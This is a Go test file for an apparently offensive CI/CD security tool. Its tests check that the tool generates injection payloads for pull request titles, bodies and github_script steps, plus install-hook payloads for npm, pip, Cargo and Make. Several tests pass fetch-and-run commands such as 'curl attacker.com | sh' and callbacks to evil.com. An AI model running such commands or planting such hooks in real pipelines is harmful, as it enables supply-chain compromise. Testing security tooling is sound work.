// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestAgent_Inject_PRTitle(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.Inject([]string{"pr_title", "id"})

	assert.True(t, result.Success)
	assert.Equal(t, "pr_title", result.Context)
	assert.NotEmpty(t, result.Payloads)

	// Should have command substitution payloads
	var hasBacktick bool
	for _, p := range result.Payloads {
		if p.Technique == "backtick_substitution" {
			hasBacktick = true
			assert.Equal(t, "`id`", p.Raw)
		}
	}
	assert.True(t, hasBacktick, "Should have backtick substitution")
}

func TestAgent_Inject_GitHubScript(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.Inject([]string{"github_script", "whoami"})

	assert.True(t, result.Success)
	assert.Equal(t, "github_script", result.Context)
	assert.NotEmpty(t, result.Payloads)

	// Should have JavaScript payloads
	var hasJS bool
	for _, p := range result.Payloads {
		if p.Technique == "template_literal_exec" {
			hasJS = true
			assert.Contains(t, p.Raw, "child_process")
		}
	}
	assert.True(t, hasJS, "Should have JavaScript payload")
}

func TestAgent_Inject_PRBody_Multiline(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.Inject([]string{"pr_body", "curl attacker.com | sh"})

	assert.True(t, result.Success)
	assert.Equal(t, "pr_body", result.Context)

	// PR body should allow newline injection
	var hasNewline bool
	for _, p := range result.Payloads {
		if p.Technique == "newline_injection" {
			hasNewline = true
		}
	}
	assert.True(t, hasNewline, "PR body should support newline injection")
}

func TestAgent_Inject_InvalidContext(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.Inject([]string{"invalid_context", "id"})

	assert.False(t, result.Success)
	assert.NotEmpty(t, result.Errors)
}

func TestAgent_Inject_MissingArgs(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.Inject([]string{"pr_title"})

	assert.False(t, result.Success)
	assert.NotEmpty(t, result.Errors)
	assert.Contains(t, result.Errors[0], "usage")
}

func TestAgent_LOTP_List(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"list"})

	assert.True(t, result.Success)
	assert.NotEmpty(t, result.DetectedVectors)

	// Should have common techniques
	techniques := make(map[string]bool)
	for _, t := range result.DetectedVectors {
		techniques[t] = true
	}
	assert.True(t, techniques["NPM"], "Should have NPM")
	assert.True(t, techniques["pip"], "Should have pip")
	assert.True(t, techniques["Cargo"], "Should have Cargo")
}

func TestAgent_LOTP_GenerateNPM(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"generate", "npm", "curl attacker.com"})

	assert.True(t, result.Success)
	assert.NotEmpty(t, result.Payloads)

	// Should have package.json payloads
	var hasPackageJSON bool
	for _, p := range result.Payloads {
		if p.File == "package.json" {
			hasPackageJSON = true
			assert.Contains(t, p.Content, "curl attacker.com")
			assert.NotEmpty(t, p.Trigger)
		}
	}
	assert.True(t, hasPackageJSON, "Should have package.json payload")
}

func TestAgent_LOTP_GenerateWithCallback(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"generate", "npm", "id", "https://evil.com"})

	assert.True(t, result.Success)
	assert.NotEmpty(t, result.Payloads)

	// Should include callback URL
	var hasCallback bool
	for _, p := range result.Payloads {
		if p.File == "package.json" && p.Properties["hook"] == "preinstall" {
			if assert.Contains(t, p.Content, "evil.com") {
				hasCallback = true
			}
		}
	}
	assert.True(t, hasCallback, "Should include callback URL")
}

func TestAgent_LOTP_GeneratePip(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"generate", "pip", "id"})

	assert.True(t, result.Success)
	assert.NotEmpty(t, result.Payloads)

	// Should have setup.py payload
	var hasSetupPy bool
	for _, p := range result.Payloads {
		if p.File == "setup.py" {
			hasSetupPy = true
			assert.Contains(t, p.Content, "CustomInstall")
		}
	}
	assert.True(t, hasSetupPy, "Should have setup.py payload")
}

func TestAgent_LOTP_GenerateCargo(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"generate", "cargo", "id"})

	assert.True(t, result.Success)
	assert.NotEmpty(t, result.Payloads)

	// Should have build.rs payload
	var hasBuildRs bool
	for _, p := range result.Payloads {
		if p.File == "build.rs" {
			hasBuildRs = true
			assert.Contains(t, p.Content, "Command::new")
		}
	}
	assert.True(t, hasBuildRs, "Should have build.rs payload")
}

func TestAgent_LOTP_GenerateMake(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"generate", "make", "id"})

	assert.True(t, result.Success)
	assert.NotEmpty(t, result.Payloads)

	// Should have Makefile payload
	var hasMakefile bool
	for _, p := range result.Payloads {
		if p.File == "Makefile" {
			hasMakefile = true
			assert.Contains(t, p.Content, "all:")
		}
	}
	assert.True(t, hasMakefile, "Should have Makefile payload")
}

func TestAgent_LOTP_GenerateInvalid(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"generate", "invalid", "id"})

	assert.False(t, result.Success)
	assert.NotEmpty(t, result.Errors)
}

func TestAgent_LOTP_Detect(t *testing.T) {
	agent := New(DefaultConfig())

	// Detect runs in current directory
	result := agent.LOTP([]string{"detect"})

	assert.True(t, result.Success)
	// May or may not find vectors depending on what's in the directory
}

func TestAgent_LOTP_DefaultDetect(t *testing.T) {
	agent := New(DefaultConfig())

	// No args should default to detect
	result := agent.LOTP([]string{})

	assert.True(t, result.Success)
}

func TestAgent_LOTP_InvalidSubcommand(t *testing.T) {
	agent := New(DefaultConfig())

	result := agent.LOTP([]string{"invalid"})

	assert.False(t, result.Success)
	assert.NotEmpty(t, result.Errors)
}

func TestInjectResult_Marshal(t *testing.T) {
	result := &InjectResult{
		Success: true,
		Context: "pr_title",
		Payloads: []PayloadOutput{
			{Raw: "`id`", Technique: "backtick"},
		},
	}

	data, err := result.Marshal()
	require.NoError(t, err)
	assert.Contains(t, string(data), "pr_title")
	assert.Contains(t, string(data), "`id`")
}

func TestLOTPResult_Marshal(t *testing.T) {
	result := &LOTPResult{
		Success:         true,
		DetectedVectors: []string{"npm", "pip"},
	}

	data, err := result.Marshal()
	require.NoError(t, err)
	assert.Contains(t, string(data), "npm")
	assert.Contains(t, string(data), "pip")
}
